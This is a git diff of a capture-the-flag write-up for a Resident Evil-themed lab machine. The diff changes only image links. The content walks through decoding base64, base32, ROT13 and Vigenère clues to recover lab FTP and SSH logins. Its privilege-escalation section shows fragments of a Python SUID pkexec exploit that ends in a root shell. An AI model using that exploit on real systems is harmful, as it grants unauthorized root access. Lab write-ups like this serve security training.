@@ -29,7 +29,7 @@ No exact OS matches for host (test conditions non-ideal).
 ```
 
 Go to URL: http://<machine_ip>
-![[bio1.png]]
+![](Assets/bio1.png)
 
 ##### Q2: How many open ports?
 ##### Answer: 3
@@ -39,26 +39,26 @@ Go to URL: http://<machine_ip>
 ### Task 2 
 Go to URL: http://<machine_ip>/mansionmain/
 And the source code is:
-![[bio2.png]]
+![](Assets/bio2.png)
 Go to URL http://<machine_ip>/diningRoom
 And the source code is:
-![[bio3.png]]
+![](Assets/bio3.png)
 and going to http://<machine_ip>/diningRoom/emblem.php we get the emblem flag.
-![[bio4.png]]
+![](Assets/bio4.png)
 Now refresh the http://<machine_ip>/diningRoom/ page and enter the retrived flag.
-![[bio5.png]]
+![](Assets/bio5.png)
 ```bash
 echo 'SG93IGFib3V0IHRoZSAvdGVhUm9vbS8=' | base64 -d
 How about the /teaRoom/
 ```
 Now go to the http://<machine_ip>/teaRoom/ and get the lockpick flag and discover new url http://<machine_ip>/artRoom 
-![[bio6.png]]
+![](Assets/bio6.png)
 Lockpick flag
-![[bio7.png]]
+![](Assets/bio7.png)
 Go to URL: http://<machine_ip>/artRoom 
-![[bio8.png]]
+![](Assets/bio8.png)
 And discover all available URL 
-![[bio9.png]]
+![](Assets/bio9.png)
 ```
 http://10.10.46.139/diningRoom/
 http://10.10.46.139/teaRoom/
@@ -72,32 +72,32 @@ http://10.10.46.139/armorRoom/
 http://10.10.46.139/attic/
 ```
 At /barRoom submit the lockpick 
-![[bio10.png]]
+![](Assets/bio10.png)
 Returns the following
-![[bio11.png]]
+![](Assets/bio11.png)
 Click Read. 
-![[bio12.png]]
+![](Assets/bio12.png)
 ```bash
 echo 'NV2XG2LDL5ZWQZLFOR5TGNRSMQ3TEZDFMFTDMNLGGVRGIYZWGNSGCZLDMU3GCMLGGY3TMZL5' | base32 -d
 music_sheet{362d72deaf65f5bdc63daece6a1f676e}
 ```
 submit the flag in the previous page
-![[bio13.png]]
+![](Assets/bio13.png)
 click YES
-![[bio14.png]]
+![](Assets/bio14.png)
 Submit the flag in previous page.
 Again submit the emblem flag in this page and get
-![[bio22.png]]
+![](Assets/bio22.png)
 I /dinningRoom submit the gold emblem flag
-![[bio23.png]]
+![](Assets/bio23.png)
 Decoding it with cyberchef in Vigenère cipher using key 'rebecca'
 `there is a shield key inside the dining room. The html page is called the_great_shield_key`
 Visiting the URL: http://<machine_ip>/diningRoom/the_great_shield_key.html get the shield key
-![[bio24.png]]
+![](Assets/bio24.png)
 In the /armorRoom submit the shield key flag
-![[bio25.png]]
+![](Assets/bio25.png)
 And then click READ 
-![[bio26.png]]
+![](Assets/bio26.png)
 And get crest3:
 ```
 crest 3:
@@ -111,37 +111,37 @@ Decoding it with cyberchef:
 `Crest3: c3M6IHlvdV9jYW50X2h`
 
 Again Submit the shield flag in /attic 
-![[bio27.png]]
+![](Assets/bio27.png)
 Click READ 
-![[bio28.png]]
+![](Assets/bio28.png)
 And get crest 4
-![[bio29.png]]
+![](Assets/bio29.png)
 Decoding it with cyberchef
 `Crest4: pZGVfZm9yZXZlcg==`
 Now visit the /diningRoom2F and view the source code
-![[bio15.png]]
+![](Assets/bio15.png)
 Decoding it with ROT13 We get
 ```
 You get the blue gem by pushing the status to the lower floor. The gem is on the diningRoom first floor. Visit sapphire.html
 ```
 Now go to http://<machine_ip>/diningRoom/sapphire.html
 and get the blue gem flag.
-![[bio16.png]]
+![](Assets/bio16.png)
 Now go to /galleryRoom and click EXAMINE.
-![[bio17.png]]
+![](Assets/bio17.png)
 and click EXAMINE.
-![[bio18.png]]
+![](Assets/bio18.png)
 Decoding it with Cyberchef We get chrest2
 `Chrest2: h1bnRlciwgRlRQIHBh`
 Go to /tigerStatusRoom
-![[bio19.png]]
+![](Assets/bio19.png)
 place the blue gem flag
-![[bio20.png]]
+![](Assets/bio20.png)
 Decoding it with Cyberchef We get chrest1
 `Chrest1: RlRQIHVzZXI6IG`
 
 Submitting the gold_emblem in /dinningRoom
-![[bio21.png]]
+![](Assets/bio21.png)
 
 Now, crest 1 + crest 2 + crest 3 + crest 4 `RlRQIHVzZXI6IGh1bnRlciwgRlRQIHBhc3M6IHlvdV9jYW50X2hpZGVfZm9yZXZlcg==`
 Decode 
@@ -150,12 +150,12 @@ echo 'RlRQIHVzZXI6IGh1bnRlciwgRlRQIHBhc3M6IHlvdV9jYW50X2hpZGVfZm9yZXZlcg==' | ba
 FTP user: hunter, FTP pass: you_cant_hide_forever
 ```
 Login with ftp and download all the files
-![[bio30.png]]
+![](Assets/bio30.png)
 From important.txt
-![[bio31.png]]
+![](Assets/bio31.png)
 hidden directory /hidden_closet/
 From 001-key.jpg
-![[bio32.png]]
+![](Assets/bio32.png)
 ```bash
 cat key-001.txt   
 cGxhbnQ0Ml9jYW
@@ -166,7 +166,7 @@ file 002-key.jpg
 002-key.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "5fYmVfZGVzdHJveV9", progressive, precision 8, 100x80, components 3
 ```
 From 003-key.jpg
-![[bio33.png]]
+![](Assets/bio33.png)
 Adding three keys
 `cGxhbnQ0Ml9jYW5fYmVfZGVzdHJveV93aXRoX3Zqb2x0`
 Decode
@@ -175,10 +175,10 @@ echo 'cGxhbnQ0Ml9jYW5fYmVfZGVzdHJveV93aXRoX3Zqb2x0' | base64 -d
 plant42_can_be_destroy_with_vjolt
 ```
 Using the key decrypt the helmet key flag
-![[bio34.png]]
+![](Assets/bio34.png)
 Submit the flag in /hidden_closet/
-![[bio35.png]]
-![[bio36.png]]
+![](Assets/bio35.png)
+![](Assets/bio36.png)
 Click READ and Get
 `wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk`
 Using [this](https://www.boxentriq.com/code-breaking/vigenere-cipher) url I solved the vigenere-cipher
@@ -187,20 +187,20 @@ Click EXAMINE and get
 `SSH password: T_virus_rules`
 
 Again submit the helmet key flag in /studyRoom
-![[bio37.png]]
+![](Assets/bio37.png)
 Click the EXAMINE and download doom.tar.gz
-![[bio38.png]]
+![](Assets/bio38.png)
 Extract and view file from doom.tar.gz
-![[bio39.png]]
+![](Assets/bio39.png)
 Now login with SSH username and password
-![[bio40.png]]
+![](Assets/bio40.png)
 Inside user home directory:
-![[bio41.png]]
+![](Assets/bio41.png)
 Go to `cd /home/weasker` and read weasker_note.txt
-![[bio42.png]]
+![](Assets/bio42.png)
 #### Privilege Escalation
 Using SUID privilege of pkexec
-![[bio43.png]]
+![](Assets/bio43.png)
 Use the following python script to get privilege 
 ```python3
 #!/usr/bin/env python3
@@ -307,4 +307,4 @@ print('[+] Call execve() with chosen payload')
 print('[+] Enjoy your root shell')
 libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
 ```
-![[bio44.png]]
+![](Assets/bio44.png)
